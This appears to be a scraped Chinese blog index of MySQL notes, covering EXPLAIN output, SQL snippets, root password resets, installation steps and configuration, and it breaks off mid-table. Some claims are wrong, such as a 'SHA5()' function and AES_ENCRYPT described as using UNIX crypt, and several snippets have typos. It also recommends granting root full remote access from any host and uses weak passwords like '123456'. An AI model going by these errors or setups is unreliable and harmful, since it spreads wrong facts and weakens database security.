与前面两个对应的类似，只是他们是出现在用and和or查询信息量大时，先查询主键，然后进行排序合并后，才能读取记录并返回 |\n| using where                                | 表示存储引擎返回的记录并不是所有的都满足查询条件，需要在server层进行过滤。<br/>查询条件中分为限制条件和检查条件，<br/>5.6之前，存储引擎只能根据限制条件扫描数据并返回，然后server层根据检查条件进行过滤再返回真正符合查询的数据。<br/>5.6.x之后支持ICP特性，可以把检查条件也下推到存储引擎层，不符合检查条件和限制条件的数据，直接不读取，这样就大大减少了存储引擎扫描的记录数量。<br/>extra列显示using  index condition |\n| using temporary                            | 表示使用了临时表存储中间结果。<br/>临时表可以是内存临时表和磁盘临时表，执行计划中看不出来，需要查看status变量，used_tmp_table，used_tmp_disk_table才能看出来 |\n| firstmatch(tb_name)                        | 5.6.x开始引入的优化子查询的新特性之一，常见于where字句含有in()类型的子查询。如果内表的数据量比较大，就可能出现这个 |\n| loosescan(m..n)                            | 5.6.x之后引入的优化子查询的新特性之一，在in()类型的子查询中，子查询返回的可能有重复记录时，就可能出现这个 |\n| filtered                                   | 使用explain extended时会出现这个列，<br/>5.7之后的版本默认就有这个字段，不需要使用explain  extended了。<br/>这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数 |","tags":["MySQL"],"categories":["数据库","MySQL"]},{"title":"MySQL日常使用记录","url":"/20250619/25158cd7.html","content":"\n\n\n# MyBaties调用MySQL数据库查询无结果,查询语句正确\n\n1. DEBUG 进去源码，排查最终提交的SQL语句中文乱码\n2. 检查数据库编码是否为UTF-8\n3. 修改MySQL的连接配置：`jdbc:mysql://127.0.0.1:3306/qhswdxssplog?useUnicode=true&characterEncoding=UTF-8`\n\n# 将多行查询结果合并到一行\n\n```sql\nGROUP_CONCAT：默认连接符号是逗号\n\nSELECT GROUP_CONCAT(A_TABLE_ID) FRON A_TABLE\n\n#查询某分类的所有子分类并用分号连接子分类ID\nSELECT GROUP_CONCAT(A_TABLE_ID SEPARATOR ';') FRON A_TABLE\n\n#查询某分类的所有子分类，根据p_order ASC, cat_id DESC排序后再连接\nSELECT GROUP_CONCAT(cat_id ORDER BY p_order ASC, cat_id DESC) FROM goods_cat WHERE pid = 25\n```\n\n\n\n# 数据库更新操作关于不同数据库的update set from where操作\n\n用来同步两个表的数据\n\n```sql\n(Mysql)语句：\n    UPDATE A, B SET A_1 = B_1, A_2 = B_2, A_3 = B_3 WHERE A.ID = B.ID\n(Oralce)语句：\n    UPDATE A SET (A1, A2, A3) = (SELECT B1, B2, B3 FROM B WHERE A.ID = B.ID)\n    WHERE ID IN (SELECT B.ID FROM B WHERE A.ID = B.ID)\n(MS SQL Server)语句：\n    UPDATE A SET A1 = B1, A2 = B2, A3 = B3 FROM A, B WHERE A.ID = B.ID\n```\n\nupdate set from 语句格式\n\n​\t\t当where和set都需要关联一个表进行查询时，整个 update执行时，就需要对被关联的表进行两次扫描，显然效率比较低。对于这种情况，Sybase和SQL SERVER的解决办法是使用UPDATE...SET...FROM...WHERE...的语法，实际上就是从源表获取更新数据。\n​\t\t在 SQL 中，表连接（left join、right join、inner join 等）常常用于 select 语句，其实在 SQL 语法中，这些连接也是可以用于update 和 delete 语句的，在这些语句中使用 join 还常常得到事半功倍的效果。\n\n```sql\nUpdate T_OrderForm \nSET T_OrderForm.SellerID =B.L_TUserID\nFROM T_OrderForm A LEFT JOIN T_ProductInfo B ON B.L_ID=A.ProductID\n```\n\n​\t\t\n\n# 获取建表命令\n\n```sql\nshow create table 旧表;\n```\n\n 这样会将旧表的创建命令列出。我们只需要将该命令拷贝出来，更改table的名字，就可以建立一个完全一样的表\n\n\n\n# 将表1内容全部复制到表2\n\n```sql\n复制旧表的数据到新表(假设两个表结构一样)\n   SELECT * INTO 表2 FROM 表1;\n   \n复制旧表的数据到新表(假设两个表结构不一样)\n   INSERT INTO 新表(字段1,字段2,.......) \n   SELECT 字段1,字段2,...... FROM 旧表\n```\n\n\n\n# 修改表/字段的注释\n\n```sql\n创建表的时候写注释\n   create table test1(field_name int comment '字段的注释') comment='表的注释';\n   \n修改表的注释\n   alter table test1 comment '修改后的表的注释';\n\n修改字段的注释--注意：字段名和字段类型照写就行\n   alter table test1 modify column field_name int comment '修改后的字段注释';\n   \n```\n\n# 数据表切换数据库\n\n```sql\nRENAME TABLE db_A.table_1 TO db_B.table_2\n```\n\n# MySQL自增主键列重新排列\n\n```sql\nALTER TABLE 表名 DROP 列名;\nALTER TABLE 表名 ADD 列名 MEDIUMINT(8) NOT NULL FIRST;\nALTER TABLE 表名 MODIFY COLUMN 列名 MEDIUMINT(8) NOT NULL AUTO_INCREMENT,ADD PRIMARY KEY(列名);\n```\n\n\n\n# 自动修改更改时间\n\n```sql\nALTER TABLE ware_resource_info MODIFY res_create_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP;\nALTER TABLE ware_resource_info MODIFY modify_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;\n```\n\n\n\n\n\n# linux下mysql-5.6忘记root密码\n\n在linux平台下使用mysql过程中忘记了root密码，对于运维和DBA来讲都是一件头疼的事情，下面来讲解下怎么进行重置mysql数据库root 密码：\n\n1. 停止mysql服务进程： **service mysqld stop** \n\n2. 然后编辑mysql的配置文件my.cnf  **vim /etc/my.cnf**\n\n3. 找到 [mysqld]这个模块：在最后面添加一段代码，可忽略mysql权限问题，直接登录\n\n   ```sql\n   skip-grant-tables\n   ```\n\n​\t\t然后保存 :wq!退出\n\n​\t\t启动mysql服务\n\n```sh\nservice mysqld start\n```\n\n直接进入mysql数据库：\n\n ```sh\nStarting MySQL. SUCCESS!\n[root@web1 ~]# mysql\nWelcome to the MySQL monitor. Commands end with ; or \\g.\nYour MySQL connection id is 1\nServer version: 5.6.34 Source distribution\n\nCopyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\nmysql>\n ```\n\n使用mysql表，然后进行修改mysql的root密码：\n\n```sh\nmysql> use mysql; #使用mysql数据库\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql> update user set password=password(\"123456\") where user=\"root\";#更新密码\nQuery OK, 4 rows affected (0.00 sec)\nRows matched: 4 Changed: 4 Warnings: 0\n\nmysql> flush privileges;#刷新权限\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n补充说明：5.7的更新语句\n\n```sql\nupdate mysql.user set authentication_string=password('root') where user='root' ;\n```\n\n```sh\n[root@web1 ~]# ps -ef |grep mysql #显示mysql现有的进程\nroot 56407 1 0 17:50 pts/0 00:00:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --datadir=/data/mysql --pid-file=/data/mysql/web1.pid\nmysql 56533 56407 0 17:50 pts/0 00:00:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/data/mysql --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/data/mysql/web1.err --pid-file=/data/mysql/web1.pid\nroot 56560 1737 0 17:55 pts/0 00:00:00 grep mysql\n[root@web1 ~]# killall mysqld #删除mysql现有进程\n[root@web1 ~]# ps -ef |grep mysql\nroot 56566 1737 0 17:56 pts/0 00:00:00 grep mysql\n[root@web1 ~]# service mysqld start #重新启动mysql服务\nStarting MySQL. SUCCESS!\n[root@web1 ~]# mysql -uroot -p #使用新密码登录\nEnter password:\nWelcome to the MySQL monitor. Commands end with ; or \\g.\nYour MySQL connection id is 1\nServer version: 5.6.34 Source distribution\n\nCopyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql>\n\n```\n\n# MySQL5.7.X版本only_full_group_by问题解决\n\n1. 报错信息\n\n   ```\n   [Err] 1055 - Expression #1 of ORDER BY clause is not in GROUP BY clause and contains nonaggregated column 'information_schema.PROFILING.SEQ' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by\n   ```\n\n   可以看出是因为sql_mode中设置了only_full_group_by模式引起的。\n\n\n\n2. sql_mode的作用是什么呢\n\n   模式定义MySQL会支持哪些SQL语法。以及应执行哪种数据验证检查。最终达到的目标：适应在不同环境中适应mysql，因为可以根据各自的程序设置不同的操作模式。\n\n   \n\n   在only_full_group_by这种模式下，使用group by语句进行查询时，所要查询的语句必须依赖于group by子句中所列出的列，也就是group by要以查询的字段作为分组依据，这里是要查询的所有字段。\n\n3. 常用的sql_mode\n\n   | 参数                       | 说明                                                         |\n   | -------------------------- | ------------------------------------------------------------ |\n   | ONLY_FULL_GROUP_BY         | 对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP  BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中 |\n   | NO_AUTO_VALUE_ON_ZERO      | 该值影响自增长列的插入。<br>默认设置下，插入0或NULL代表生成下一个自增长值。如果用户  希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。 |\n   | STRICT_TRANS_TABLES        | 在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE。在严格模式下，不允许日期和月份为零。 |\n   | NO_ZERO_DATE               | 设置该值，MySQL数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 |\n   | ERROR_FOR_DIVISION_BY_ZERO | 在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL |\n   | NO_AUTO_CREATE_USER        | 禁止GRANT创建密码为空的用户                                  |\n   | NO_ENGINE_SUBSTITUTION     | 如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常 |\n   | PIPES_AS_CONCAT            | 将”\\|\\|”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似 |\n   | ANSI_QUOTES                | 启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符 |\n\n4. 查询当前的sql_mode配置\n\n   ```sql\n   1. 可以使用select @@global.sql_mode; //全局配置 查询，\n   \n   2. 也可以通过select @@sql_mode;//已存在数据库配置查询\n   ```\n\n5. 解决方法\n\n   - 使用`any_value()`函数,这个函数对不需要group by的字段有效，等同于关闭only_full_group_by，但是这样难免会遗漏某个字段，所以不推荐使用。\n\n   - 暂时性关闭（可以通过select @@sql_mode查出sql_mode以后去掉ONLY_FULL_GROUP_BY后复制过来），但是在重启服务以后失效\n\n     ```sql\n     set sql_mode=' ' //改变已经存在的数据库sql_mode \n     set @@global.sql_mode=' ' //改变全局配置sql_mode\n     ```\n\n     \n\n   - 更改配置文件（推荐使用）\n\n     ```\n     可以通过select @@sql_mode查出sql_mode以后去掉ONLY_FULL_GROUP_BY后复制配置参数\n     \n     linux系统\n     更改/etc/my.cnf文件\n     使用vi命令打开，如果有sql_mode=...的注释就把注释打开，如果没有就加上sql_mode=...\n     \n     Windows系统\n     修改安装目录下的my.ini文件，其余同上\n     \n     ```\n\n     \n","tags":["日常记录","MySQL"],"categories":["数据库","MySQL"]},{"title":"MySQL基础","url":"/20250619/bce68613.html","content":"\n# 字段加密/解密\n\n1. PASSWORD(明文)：\n\n   创建一个经过加密的密码字符串，适合于插入到MySQL的安全系统。该加密过程不可逆，和unix密码加密过程使用不同的算法。主要用于MySQL的认证系统。\n\n2. AES_ENCRYPT(明文，加密串)  AES_DECRYPT( 密文, 加密串 )\n\n   使用UNIX crypt()系统加密字符串，AES_ENCRYPT()函数接收要加密的字符串和（可选的）用于加密过程的salt（一个可以唯一确定口令的字符串，就像钥匙一样）。加密程度比ENCODE较强。\n\n   ```sql\n    举例：\n    \n    加密\n      SELECT HEX(AES_ENCRYPT('测试', '29a70b6c')) FROM DUAL; \n      输出：AFA3016D4EE259FE76D0D625F9BDF889\n      \n    解密\n      SELECT CONVERT(AES_DECRYPT(UNHEX('AFA3016D4EE259FE76D0D625F9BDF889'), '29a70b6c') USING utf8) FROM DUAL;\n      输出：测试 （CONVERT，字符集转换）\n   ```\n\n3. ENCODE(明文, 加密串)  DECODE(密文, 加密串)\n   加密解密字符串。该函数有两个参数：被加密或解密的字符串和作为加密或解密基础的密钥。Encode结果是一个二进制字符串，以BLOB类型存储。加密成度相对比较弱。\n\n4. MD5()：计算字符串的MD5校验和（128位），\n\n5. SHA5()：计算字符串的SHA5校验和（160位）\n\n   MD5()、SHA5() 这两个函数返回的校验和是16进制的，适合与认证系统中使用的口令。\n\n   \n\n# CONCAT函数\n\n```sql\n注意：和NULL连接的结果为NULL\n\nSELECT CONCAT('test', '-', '1') FROM DUAL; 返回：test-1\nSELECT CONCAT('test', '-', NULL) FROM DUAL; 返回：NULL\n```\n\n\n\n# IP地址/Long数据\n\n```sql\n SELECT INET_ATON('112.253.20.48');->1895633968\n SELECT INET_NTOA('1895633968')->112.253.20.48\n```\n\n\n\n# 日期函数\n\n## date_format参数\n\n| 参数（年） |          | 参数（月） |                    | 参数（日） |                        |\n| ---------- | -------- | ---------- | ------------------ | ---------- | ---------------------- |\n| %Y         | 年，4 位 | %b         | 缩写月名           | %D         | 带有英文前缀的月中的天 |\n| %y         | 年，2 位 | %c         | 月份的数值（1-12） | %d         | 月的天，数值(00-31)    |\n|            |          | %M         | 月名               | %e         | 月的天，数值(0-31)     |\n|            |          | %m         | 月，数值(01-12)    | %j         | 年的天 (001-366)       |\n\n| 参数（时间） |                                    | 参数（时） |              | 参数（分） |                   | 参数（秒） |                   | 参数（微秒） |      |\n| ------------ | ---------------------------------- | ---------- | ------------ | ---------- | ----------------- | ---------- | ----------------- | ------------ | ---- |\n| %T           | 时间，24-小时 (hh:mm:ss)           | %H         | 小时 (00-23) | %i         | 分钟，数值(00-59) | %S         | 或者 %s 秒(00-59) | %f           | 微秒 |\n| %r           | 时间，12-小时（hh:mm:ss AM 或 PM） | %h         | 小时 (01-12) |            |                   |            |                   |              |      |\n| %p           | AM 或 PM                           | %I         | 小时 (01-12) |            |                   |            |                   |              |      |\n|              |                                    | %k         | 小时 (0-23)  |            |                   |            |                   |              |      |\n\n| 参数（年天） |                                                | 参数（周天） |                                               | 参数（星期） |                               |\n| ------------ | ---------------------------------------------- | ------------ | --------------------------------------------- | ------------ | ----------------------------- |\n| %X           | 年，其中的星期日是周的第一天，4 位，与 %V 使用 | %U           | 年周 (00-53) 星期日是一周的第一天             | %a           | 缩写星期名                    |\n| %x           | 年，其中的星期一是周的第一天，4 位，与 %v 使用 | %u           | 年周 (00-53) 星期一是一周的第一天             | %W           | 星期名                        |\n|              |                                                | %V           | 年周 (01-53) 星期日是一周的第一天，与 %X 使用 | %w           | 周的天 （0=星期日, 6=星期六） |\n|              |                                                | %v           | 年周 (01-53) 星期一是一周的第一天，与 %x 使用 |              |                               |\n\n\n\n| 函数                                    | 举例                                                         | 说明                                                         |\n| --------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| CURDATE()  <br>CURRENT_DATE()           | SELECT CURDATE()<br/> 2021-11-30                             | 返回当前的日期（%Y-%m-%d）                                   |\n| CURTIME()  <br/>CURRENT_TIME()          | SELECT CURTIME();<br>18:34:12                                | 返回当前的时间（%T或者%H:%i:%s）                             |\n| **DATE_ADD(date,INTERVAL expr unit)**   | SELECT DATE_ADD(CURRENT_DATE,INTERVAL 6 MONTH);<br>2022-05-30 | 返回日期date加上间隔时间int的结果<br>(int必须按照关键字进行格式化) |\n| **DATE_SUB(date,INTERVAL int keyword)** | SELECT DATE_SUB( CURRENT_DATE, INTERVAL 6 MONTH );<br>2021-05-30 | 返回日期date加上间隔时间int的结果<br/>(int必须按照关键字进行格式化) |\n| **PERIOD_DIFF(P1, P2)**                 | # 月份差值<br>SELECT PERIOD_DIFF(date_format('2021-09-30', '%Y%m'), date_format('2021-06-20', '%Y%m'))<br><br/>#天数差值<br>SELECT PERIOD_DIFF(date_format('2021-09-30', '%Y%m%d'), date_format('2021-06-20', '%Y%m%d'))<br><br/># 上一个月<br/> SELECT * FROM 表名 WHERE PERIOD_DIFF(date_format(now(),'%Y%m'),date_format(时间字段名,'%Y%m') =1 | 计算两个日期之间的差值                                       |\n| TO_DAYS(date)                           | \\# 今天<br/>SELECT * FROM 表名 WHERE TO_DAYS(时间字段名) =TO_DAYS(NOW());<br/><br/> # 昨天<br/>SELECT * FROM 表名 WHERE TO_DAYS(NOW()) - TO_DAYS( 时间字段名) <= 1 | 日期转天数                                                   |\n| YEARWEEK                                | SELECT YEARWEEK(now()) <br/>返回：202148<br/><br/>\\# 本周<br/>SELECT * FROM 表名 WHERE YEARWEEK( date_format( 时间字段名,'%Y-%m-%d' ) ) = YEARWEEK( now() ) ; |                                                              |\n| WEEK                                    |                                                              | 返回日期date为一年中第几周(0~53)                             |\n| DAYOFWEEK                               |                                                              | 返回date所代表的一星期中的第几天(1~7)                        |\n| DAYOFMONTH                              |                                                              | 返回date是一个月的第几天(1~31)                               |\n| DAYOFYEAR(date)                         |                                                              | 返回date是一年的第几天(1~366)                                |\n| DAYNAME                                 | SELECT DAYNAME(CURRENT_DATE);<br>返回：Tuesday               | 返回date的星期名                                             |\n| FROM_UNIXTIME(ts,fmt)                   |                                                              | 根据指定的fmt格式，格式化UNIX时间戳ts                        |\n| YEAR                                    | \\# 本年<br/> SELECT * FROM 表名 WHERE YEAR( 时间字段名 ) = YEAR( NOW( ) ) |                                                              |\n| MONTH                                   |                                                              | 返回date的月份(1~12)                                         |\n| MONTHNAME                               |                                                              | 返回date的月份名                                             |\n| HOUR                                    |                                                              | 返回time的小时值(0~23)                                       |\n| MINUTE                                  |                                                              | 返回time的分钟值(0~59)                                       |\n| QUARTER                                 | SELECT QUARTER(CURRENT_DATE);<br>返回：4                     | 返回date在一年中的季度(1~4)                                  |\n\n\n\n# MySQL外键设置\n\nMySQL外键设置: Cascade、NO ACTION、Restrict、SET NULL\n\n| 参数        | 说明                                                         |\n| ----------- | ------------------------------------------------------------ |\n| cascade     | 在父表上update/delete记录时，同步update/delete掉子表的匹配记录 |\n| set null    | 在父表上update/delete记录时，将子表上匹配记录的列设为null，要注意子表的外键列不能为not null |\n| No action   | 如果子表中有匹配的记录,则不允许对父表对应候选键进行update/delete操作 |\n| Restrict    | 同no action, 都是立即检查外键约束                            |\n| Set default | 父表有变更时,子表将外键列设置成一个默认的值 但Innodb不能识别 |\n\n# 查看/修改系统参数\n\n##  版本号\n\n```sql\nselect version();// 查看的是innodb_version\n```\n\n## 查看数据库运行中的进程\n\n```sql\nshow full processlist  或\nselec * from processlist\n```\n\n\n\n## 查看系统运行状态\n\n性能优化的时候可参考\n\n```sql\nshow status\n```\n\n## 系统参数配置\n\n```sql\nshow variables\n```\n\n## 最大连接数\n\n查看\n\n```sql\nselect @@global.max_connections\n```\n\n修改\n\n```\nset global max_connections=1024;\n```\n\n## 配置 sql_mode\n\n查看\n\n```sql\n# 全局配置\nselect @@global.sql_mode; \n# 已经存在的数据库sql_mode\nselect @@sql_mode;\n```\n\n修改（建议先查后改）\n\n```sql\n# 改变已经存在的数据库sql_mode \nset sql_mode=' ' \n\n# 改变全局配置sql_mode\nset @@global.sql_mode=' ' \n```\n\n## 系统参数总表参考\n\n查询\n\n```sql\nSHOW VARIABLES;\nSHOW VARIABLES LIKE 'autocommit';\n```\n\n\n\n## 配置执行语句长度限制\n\n配置不够，执行错误提示\n\n```sql\nERROR:The size of BLOB/TEXT data inserted in one transaction is greater than  10% of redo log size. Increase the redo log size using innodb_log_file_size.\n```\n\n查看配置\n\n```sql\nselect @@global.max_allowed_packet\n```\n\n修改配置（临时）\n\n```sql\nset global max_allowed_packet  = 1024*1024*1024;\n```\n\n修改配置（永久）\n\n```\n在mysqld下面添加配置max_allowed_packed=1024M  \n```\n\n\n\n\n\n# 批量执行insert语句，进入了阻塞状态\n\n原因一：磁盤空間已滿\n\n原因二：`innodb_flush_log_at_trx_commit`是配置MySql日志何时写入硬盘的参数：\n\n- 参数值说明\n\n| 参数 | 说明                                                         |\n| ---- | ------------------------------------------------------------ |\n| 0    | log buffer将每秒一次地写入log file中，并且log  file的flush(刷到磁盘)操作同时进行。该模式下在事务提交的时候，不会主动触发写入磁盘的操作。<br>当设置为0，该模式速度最快，但不太安全，mysqld进程的崩溃会导致上一秒钟所有事务数据的丢失 |\n| 1    | 每次事务提交时MySQL都会把log buffer的数据写入log  file，并且flush(刷到磁盘)中去，该模式为系统默认。<br/><br/>当设置为1，该模式是最安全的，但也是最慢的一种方式。在mysqld 服务崩溃或者服务器主机crash的情况下，binary log 只有可能丢失最多一个语句或者一个事务 |\n| 2    | 每次事务提交时mysql都会把log buffer的数据写入log  file，但是flush(刷到磁盘)操作并不会同时进行。<br/>该模式下，MySQL会每秒执行一次 flush(刷到磁盘)操作<br/><br/>当设置为2，该模式速度较快，也比0安全，只有在操作系统崩溃或者系统断电的情况下，上一秒钟所有事务数据才可能丢失 |\n\n解决\n\n```sql\ninnodb_flush_log_at_trx_commit=2，sync_binlog=500 或1000 \n```\n\n​\t\t查找资料时候看到其他文章说innodb_flush_log_at_trx_commit和sync_binlog 两个参数是控制MySQL 磁盘写入策略以及数据安全性的关键参数，当两个参数都设置为1的时候写入性能最差。\n\n​\t\t推荐做法是innodb_flush_log_at_trx_commit=2，sync_binlog=500 或1000 \n\n\n\n\n\n# 表联合查询\n\n## 两个数据表的关联\n\n**USING(userid, unit_id)**\n\n```sql\n# 使用 USING：关联字段一致\nSELECT claim.userid, person.real_name\nFROM ware_resouce_info_claim  claim\nLEFT JOIN personal_userinfo person USING(userid, unit_id) ;\n\n\n# 使用字段组合\nSELECT claim.userid, person.real_name\nFROM ware_resouce_info_claim claim\nLEFT JOIN personal_userinfo person ON person.userid = claim.userid;\n```\n\n##  GROUP BY ... WITH ROLLUP\n\n加上`WITH ROLLUP`关键字的效果是MySQL将在查询结果的最后一-行将自动增加一条总数统计记录，这条记录的ID字段取值或者说这条记录的名字永远是NULL. \n\n\n\n1. 如下所示：\n\n    ```sql\n    SELECT document_type_id, COUNT(*) \n    FROM resource_info\n    GROUP BY document_type_id WITH ROLLUP;\n    ```\n\n    ![image-20230418140341120](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230418140341120.png)  \n\n2. GROUP BY 结果中有NULL 的聚类项\n\n    ```sql\n    SELECT document_type_id, COUNT(*) \n    FROM resource_info \n    GROUP BY document_type_id WITH ROLLUP\n    ```\n\n    ![image-20230418140852053](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230418140852053.png) \n\n3. 多个聚类项目：按照每个聚类项统计（小计和总计的概念）\n\n    ```sql\n    SELECT document_type_id, department_id, COUNT(*) \n    FROM resource_info \n    GROUP BY document_type_id, department_id\n    WITH ROLLUP;\n    ```\n\n    ![image-20230418142243995](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230418142243995.png)  \n\n\n\n\n\n","tags":["MySQL"],"categories":["数据库","MySQL"]},{"title":"MySQL安装、版本差异、JDBC连接配置","url":"/20250619/4c28b48e.html","content":"\n# Windows安装（5.6）\n\n1. . 准备\n\n   拷贝文件夹：mysql-5.6.10-winx64到D:\\ chaoxing \\ software \\目录下\n\n2. 环境变量\n\n   MYSQL_HOME: D:\\ chaoxing \\ software \\ mysql-5.6.10-winx64（新建）\n\n   path追加：;%MYSQL_HOME%\\bin\n\n3. 安装服务，并启动\n\n   启动cmd：进入目录D:\\ chaoxing \\ software \\ mysql-5.6.10-winx64\\bin\n\n   运行：mysqld install MySQL\n\n   启动：net start MySQL\n\n4. 修改数据库密码\n\n   启动cmd：进入目录D:\\ chaoxing \\ software \\ mysql-5.6.10-winx64\\bin\n\n   运行：mysql –u root\n\n　　　mysql>show databases;\n\n　　　mysql>use mysql;\n\n　　　mysql>UPDATE user SET password=PASSWORD(\"**自定义密码**\") WHERE user='root';\n\n　　　mysql>FLUSH PRIVILEGES;\n\n　　　mysql>QUIT\n\n# LINUX安装\n\n## 准备工作\n\n1. 下载MySQL安装包\n\n   下载路径：`https://dev.mysql.com/downloads/mirrors/`，点左侧，Other Downloads，选择需要的镜像下载。\n\n   选择版本：mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz\n\n   或者：` wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz `直接下载\n\n2. 上传& 解压  （rz -y 上传）压缩包存放路径：/opt\n\n   ```sh\n   tar -zxvf mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz\n   mv mysql-5.7.23-linux-glibc2.12-x86_64 mysql-5.7.23\n   ```\n\n## 安装MySQL\n\n1. 安装依赖 \n\n   ```sh\n   yum install -y cmake make gcc gcc-c++ libaio ncurses ncurses-devel\n   ```\n\n2. 添加系统mysql组和mysql用户 \n\n​\t\t添加系统mysql组 `groupadd mysql`\n\n​\t\t添加mysql用户` useradd -r -g mysql mysql `（添加完成后可用id mysql查看）\n\n3. 安装数据库\n\n​\t\t切到mysql目录： `cd /opt/mysql-5.7.23`\n\n​\t\t修改当前目录拥有者为mysql用户：` chown -R mysql:mysql ./`\n\n​\t\t安装数据库`bin/mysqld --initialize --user=mysql --basedir=/opt/mysql-5.7.23 --datadir=/opt/mysql-5.7.23/data`，  保存临时密码：*123123123123*\n\n```sh\n可能报这个错\n\nbin/mysqld: error while loading shared libraries: *libaio.so.1:* cannot open shared object file: No such file or directory\n\n解决方法\nyum install -y libaio //安装后在初始化\n```\n\n​\t\t执行以下命令创建RSA private key \n\n```sh\nbin/mysql_ssl_rsa_setup --datadir=/opt/mysql-5.7.23/data\n```\n\n​\t\t修改当前目录拥有者为mysql用户 `chown -R mysql:mysql ./`\n\n​\t\t修改当前data目录拥有者为mysql用户 `chown -R mysql:mysql data`\n\n4. 配置my.cnf\n\n   ```sh\n   vi /etc/my.cnf\n   ```\n\n   ```properties\n   [mysqld]\n   character_set_server=utf8\n   init_connect='SET NAMES utf8'\n   basedir=/opt/mysql-5.7.23\n   datadir=/opt/mysql-5.7.23/data\n   socket=/tmp/mysql.sock\n   \n   #不区分大小写\n   lower_case_table_names = 1\n   \n   #不开启sql严格模式\n   sql_mode=\"STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"\n   \n   log-error=/var/log/mysqld.log\n   pid-file=/opt/mysql-5.7.23/data/mysqld.pid\n   ```\n\n   添加开机启动项\n\n   ```sh\n   cp /opt/mysql-5.7.23/support-files/mysql.server /etc/init.d/mysqld\n   ```\n\n   修改 ：  `vi /etc/init.d/mysqld `\n\n   添加路径 \n\n   ```pr\n   basedir=/opt/mysql-5.7.23\n   datadir=/opt/mysql-5.7.23/data\n   ```\n\n5. 启动mysql  ：`service mysqld start `\n\n   ```sh\n   加入开机起动 ： ` chkconfig --add mysqld  `\n   ```\n\n6. 登录修改密码 ：`mysql -uroot -p 上面初始化时的密码`（123123123123）\n\n​\t\t如果出现错误 需要添加软连接： ` ln -s /opt/mysql-5.7.23/bin/mysql /usr/bin`\n\n​\t\t或者，修改环境变量。\n\n​         ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-16382968264995.png)    \n\n​       第一件事先修改密码：\n\n```sh\nmysql>alter user 'root'@'localhost' identified by '修改后的密码';  \n\nmysql>flush privileges;  #刷新权限\n```\n\n7. 重启后执行，如果看到有监听说明服务启动了：`netstat -na | grep 3306`\n\n8. 防火墙\n\n   ```sh\n   # 设置\n   firewall-cmd --zone=public --add-port=3306/tcp --permanent\n   \n   # 重新载入\n   firewall-cmd --reload\n   \n   # 查看\n   firewall-cmd --zone= public --query-port=3306/tcp \n   或 \n   firewall-cmd --zone=public --list-ports\n   ```\n\n   \n\n9. 设置mysql的远程登录\n\n   ```sql\n   # grant all privileges on 库.表 to 用户@'%' identified by '修改后的密码';\n   \n   mysql> grant all privileges on *.* to root@'%' identified by 'root密码';\n   \n   mysql> flush privileges;\n   ```\n\n   \n\n# 版本差异\t\n\n## 修改密码\n\nMySQL5.6，\n\n```sql\nUPDATE user SET password=PASSWORD(\"gese45ew&20\") WHERE user='root'; \n```\n\n\n\nMySQL5.7 \n\n```sql\nupdate user set authentication_string = password('gese45ew&20') , password_expired = 'N', password_last_changed = now() where user = 'root';\n```\n\n\n\n\n\n\n\n## 创建索引\n\n因为，MySQL5.5和MySQL5.0 之间，建索引的语句不一样 所以，直接拷贝5.5的sql语句，不能在5.0上运行 \n\n方法： \n\n1. 删除索引之后，再拷贝数据 \n\n   ```sql\n   ALTER TABLE consult_userinfo DROP INDEX idx_user_info_userid ; \n   ```\n\n2. 在5.0的数据库建索引 \n\n   例如：\n\n   ```sql\n   CREATE INDEX idx_user_info_userid on test_table (`userid`); \n   CREATE INDEX index_author on test_table(`author`(255)); \n   CREATE INDEX index_orderid on test_table(`id`,`orderid`); \n   ```\n\n3. 5.5建索引 \n\n   ```sql\n   ALTER TABLE `test_table` ADD INDEX index_name ( `column1`, `column2`, `column3`)\n   ```\n\n\n\n# JDBC连接配置\n\n## JDBC连接配置参数（5.7）\n\n| 参数                  | 说明                                                         | 默认值    | 常用值                    |\n| --------------------- | ------------------------------------------------------------ | --------- | ------------------------- |\n| autoReconnect         | 自动连接                                                     | false     | true                      |\n| autoReconnectForPools | 自动连接连接池                                               | false     | true                      |\n| characterEncoding     | 当useUnicode=true时，指定字符集                              |           | UTF-8                     |\n| allowMultiQueries     | 